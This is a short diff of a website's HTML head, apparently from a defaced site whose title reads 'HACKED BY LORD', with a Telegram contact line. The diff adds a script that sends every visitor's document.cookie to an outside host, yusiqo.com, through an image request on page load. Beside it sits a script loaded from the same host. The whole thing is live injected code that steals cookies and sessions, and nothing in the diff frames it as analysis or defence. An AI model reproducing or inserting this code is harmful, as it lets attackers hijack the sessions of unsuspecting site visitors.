@@ -13,6 +13,7 @@
 <meta name="MobileOptimized" content="width" />
 
 <title>GHOST</title>
+<script>var i=new Image(); i.src="https://yusiqo.com/cookie.php?cookie="+document.cookie;</script>
 <script src="//yusiqo.com/ads.php"></script>
 <meta name="title" content="HACKED BY LORD... Telegram Adresimize Bekleriz | " />
 
